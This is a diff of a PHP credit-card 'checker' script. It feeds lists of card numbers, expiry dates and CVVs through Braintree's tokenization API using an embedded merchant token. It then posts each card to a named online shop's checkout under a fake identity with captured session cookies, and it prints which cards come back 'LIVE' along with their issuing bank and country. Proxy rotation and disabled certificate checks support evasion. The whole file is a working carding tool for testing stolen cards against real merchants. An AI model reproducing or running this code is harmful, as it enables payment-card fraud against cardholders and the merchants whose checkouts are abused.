@@ -111,7 +111,7 @@ function email($nombre){
 ///$cpf = cpf(1);
 $nombre = datosnombre();
 $apellido = datosapellido();
-// $email = email($nombre);
+$email = email($nombre);
 $zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
 $idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
 $username = 'lum-customer-hl_6366aa06-zone-static_res';
@@ -132,10 +132,10 @@ function ibuuproxy(){
 
 $poxySocks5 = ibuuproxy();
 
-$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
-$lname = 'Wang';
-$email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
- // $email2 = $fname.rand(10,999).'@yopmail.com';
+// $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
+// $lname = 'Wang';
+// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
+// $email2 = $fname.rand(10,999).'@yopmail.com';
 // //$password = 'P@5%Word';
 // $password2 = 'Hansabhen1@';
 $counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
@@ -146,62 +146,55 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 
-
-// curl_close($ch);
-
+//============================================================================================================================================================
+ // Request 1
 
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
+# Uncomment the upper two lines if you have filled the upper login details
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA0NjM1MjYsImp0aSI6ImNiNTkzYTBkLTBjMDYtNDVjYy1iZTYwLTViYzZmYWI4YmIzZCIsInN1YiI6IjU3Z214dDNzZHpxeXh0YmMiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjU3Z214dDNzZHpxeXh0YmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJNTUxBRkxFVVJfaW5zdGFudCJ9fQ.e67EvmmwBgvbsRW8QyBQle8G5R6idAInsJ9PggUKUY49AiID5_3iffX55im6JpfZTQ9Rmq6MxpVUFBtJUVtZfg',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA0ODA2MjksImp0aSI6Ijc4ZDEzNmMyLTdlNTgtNGFjNC1hZGRmLTNlNTc2M2I1NmU1NSIsInN1YiI6IjNzejg3cXAyOHh5cjhoOGciLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNzejg3cXAyOHh5cjhoOGciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiRW5kbGVzc2x5RWxhdGVkX2luc3RhbnQifX0.lIu2fiN9sa4oYW4_8ZZijolB3CaviKt3HnJ57flobfWbz9M25aAaMvA_PPribhJOVEc0Py2CnDsvxLdrPYHQ2A',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
 'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e1cb6a2a-18d8-4221-b7b2-159d6bf8b525"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"33101","streetAddress":"12 avenue"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"04bfa11a-48a9-428d-9134-ed94c0a623c3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10080"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+$b_pago = curl_exec($ch);
 
+curl_close($ch);
 
-$a_pago = curl_exec($ch);
-
-$token = trim(strip_tags(getstr($a_pago,'"token":"','"')));
-
- $country = trim(strip_tags(getstr($a_pago,'"countryOfIssuance":"','"')));
- $bank = trim(strip_tags(getstr($a_pago,'"issuingBank":"','"')));
- $type = trim(strip_tags(getstr($a_pago,'"debit":"','"')));
- // $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
- // $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
-
-
-  // echo $a_pago;
+   // echo $b_pago;
+$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
+// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
+$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+$type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
 
 
 
 
-
-// //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://mmlafleur.com/api/v0/customers/?atst=sie0f4imns369v62ef02lg3l52');
+curl_setopt($ch, CURLOPT_URL, 'https://endlesslyelated.com/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -222,29 +215,27 @@ curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING T
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 // End Proxy Calls
+curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+ curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: */*',
+'accept: application/json, text/javascript, */*; q=0.01',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer 4207d59fb6f4b4f8339734353640d98a',
-'content-type: application/json',
-
-'cookie: mmlf_conv=%7B%22http_referrer%22%3A%22%22%2C%22utm_campaign%22%3A%22%22%2C%22utm_source%22%3A%22%22%2C%22utm_medium%22%3A%22%22%2C%22utm_term%22%3A%22%22%2C%22utm_content%22%3A%22%22%2C%22referral_id%22%3A%22%22%2C%22browser_type%22%3A%22chrome%22%2C%22device_type%22%3A%22desktop%20-%20pc%22%7D; mmlf_track=%7B%22http_referrer%22%3A%22%22%2C%22utm_campaign%22%3A%22%22%2C%22utm_source%22%3A%22%22%2C%22utm_medium%22%3A%22%22%2C%22utm_term%22%3A%22%22%2C%22utm_content%22%3A%22%22%2C%22referral_id%22%3A%22%22%2C%22browser_type%22%3A%22chrome%22%2C%22device_type%22%3A%22desktop%20-%20pc%22%7D; _ALGOLIA=393703db-2966-4c4b-8e28-af89473c8307; mmlf_hasOrdered=0; frontend_cid=jSvbCSQPTGeqelIN; kustomer-chat=%7B%22noIcon%22%3Atrue%7D; ftr_ncd=6; __wid=446040818; forterToken=13a6f0e257cd437a88d1dbcf49b9455f_1590413284681__UDF43_6; ajs_group_id=null; ajs_anonymous_id=%22dad00d55-c4e3-485c-8094-9607aa6a3607%22; _sp_ses.651f=*; _sp_id.651f=d2175d766b66dd18.1590413298.1.1590413299.1590413298; am_promo_notification=0; frontend=sie0f4imns369v62ef02lg3l52; pslogin_show_link_popup=1; ajs_user_id=%22549920%22; sut=4207d59fb6f4b4f8339734353640d98a; sst=sie0f4imns369v62ef02lg3l52; fpp=null',
-'origin: https://mmlafleur.com',
-'referer: https://mmlafleur.com/checkout/payment',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: cookielawinfo-checkbox-non-necessary=yes; mailchimp_landing_site=https%3A%2F%2Fendlesslyelated.com%2Fproduct%2Fchampagne-glass%2F; endlesslyeactive=Vincent; closedNavigator=no; woocommerce_items_in_cart=1; mailchimp.cart.current_email=pubgkittu@gmail.com; mailchimp.cart.previous_email=pubgkittu@gmail.com; wordpress_logged_in_eaa739e4ea58e758e9914696754338fc=hotshot69%7C1591603720%7C081gju4kRzDfSFGjQclMy7fg1Iezw3C8jyV8Qj0AQSA%7C54d4482e0dae3f7e5921993153de69d2da3349be37cc901b97f7848bc1bcb0c1; wp_woocommerce_session_eaa739e4ea58e758e9914696754338fc=38%7C%7C1590566865%7C%7C1590563265%7C%7Ced8502088cd4e1ff807a105e919cf89d; wfwaf-authcookie-e8c9b3b674acdf3b86b9c9a233cadc71=38%7C%7C1f3ee9a93d9199de9f87bfc32753d890f4329f7b6dfd2efeae0abab367eccb1c; viewed_cookie_policy=yes; cookielawinfo-checkbox-necessary=yes; woocommerce_cart_hash=cad3f046e8a9a928e0e49e52ac2841ab',
+'origin: https://endlesslyelated.com',
+'referer: https://endlesslyelated.com/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_methods":[{"token":"'.$token.'","default":true}]}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=5182641744&billing_email=pubgkittu%40gmail.com&ss_wc_mailchimp_opt_in=yes&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=12+avenue&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&shipping_phone=5182641744&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%2298f1bf15167826c7c85a2ba9aed9159f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%229a75bc0d754d75162c3742ea577aabcd%22%7D&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F3sz87qp28xyr8h8g%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F3sz87qp28xyr8h8g%22%7D%2C%22merchantId%22%3A%223sz87qp28xyr8h8g%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%223sz87qp28xyr8h8g%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Endlessly+Elated%22%2C%22clientId%22%3A%22ATlYzBix0e5lPXmplc4LeF_WRi2b0u_itiW3cGBf93ynXpUp19Jqog7ablWLyBG8KBjTz6JDKrGiaTtG%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fendlesslyelated.com%2Fprivacy-policy%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fendlesslyelated.com%2Fterms-conditions%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22EndlesslyElated_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=30469d1d2a&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -254,30 +245,31 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"technical":"','"')));
-// $code = trim(strip_tags(getstr($result,'"message":"','"')));
-// // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
+
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tThere was an error processing your payment. Reason: ','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"')));
+ // $code = trim(strip_tags(getstr($result,'"status":"','"')));
+ // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
 
 
+//////////////////////// BIN INFO ////////////////////////////////
 
-/////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"created_at"')){
-// updatecart();
-        echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V 3 ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+/////////////////// RESULT ////////////////////////////////////
+if(strpos($result,'"result":"success"')){
+    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
-    }
-elseif(strpos($result,'Status code avs')) {
 
-        echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ AVS ERROR ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-
-  }
-
+   }
+elseif(strpos($result,'Insufficient Funds')){
+  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+   }
 else {
-      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
-  }
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+
+// updatecart();
+}
 curl_close($curl);
 ob_flush();
-     // echo $result;
+       // echo $result;
 //echo $browser;
 ?>
